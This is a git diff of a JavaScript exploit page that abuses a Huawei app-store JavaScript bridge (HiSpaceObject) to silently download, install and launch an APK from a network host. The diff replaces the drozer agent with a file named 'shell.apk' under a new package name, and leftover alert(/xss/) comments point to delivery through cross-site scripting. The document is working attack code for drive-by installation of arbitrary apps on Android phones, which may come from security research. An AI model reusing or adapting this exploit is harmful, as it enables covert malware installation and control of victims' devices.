@@ -17,12 +17,12 @@ var dataConfig = {
                 isHuawei: true,
                 isWeiXinOrWeiBo: false,
                 installInfo: {
-                    url: "http://192.168.43.35/drozer.apk", //url必须有值且正确
+                    url: "http://192.168.43.35/shell.apk", //url必须有值且正确
                     extendName: 'invalid',
                     name: 'drozer Agent',
-                    packageName: 'com.mwr.dz', //和安装包名不符合时，会在桌面遗留一个“正在安装”的图标，重启后可移除
+                    packageName: 'com.kora.broadcast', //和安装包名不符合时，会在桌面遗留一个“正在安装”的图标，重启后可移除
                     callerName: 'invalid',
-                    size: '633111', //size必须有值且正确
+                    size: '636547', //size必须有值且正确
                     iconUrl: "http://cusas.github.io/favor.png",
                     version: "505",
                     appId: "C10149090",
@@ -33,12 +33,12 @@ window.HiSpaceObject.startDownload(JSON.stringify(dataConfig.installInfo));
 alert("started");
 var int=setInterval("getappstatus();",500);
 function getappstatus() {
-  var status= window.HiSpaceObject.getAppStatus("com.mwr.dz");
+  var status= window.HiSpaceObject.getAppStatus("com.kora.broadcast");
   //var status= window.HiSpaceObject.getAppStatus("com.huawei.securitymgr");
   if(status.indexOf("status\":0")>-1) {
     int=clearInterval(int);
     //alert(/xss/);
-    window.HiSpaceObject.launchApp("com.mwr.dz",null,null);
+    window.HiSpaceObject.launchApp("com.kora.broadcast",null,null);
     //alert(/xss2/);
   }
   //alert(status);
